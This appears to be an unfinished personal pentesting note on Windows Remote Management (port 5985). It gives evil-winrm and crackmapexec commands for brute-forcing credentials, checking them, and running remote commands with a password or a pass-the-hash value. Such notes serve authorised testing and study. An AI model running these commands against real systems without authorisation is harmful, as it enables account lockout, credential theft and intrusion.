---
title: 5985 - WinRM
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---

# {{title}}

> [!abstract] Summary  
> A brief description of this note.  

If you got credentials you can use Evil-WinRM for CLI access:

$ evil-winrm -i ip -u username -p password

If you are not sure how to get credentials from this port:

** This could block users **

#Brute force

crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials

# Username + Password + CMD command execution

crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"

# Username + Hash + PS command execution

crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'

# Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
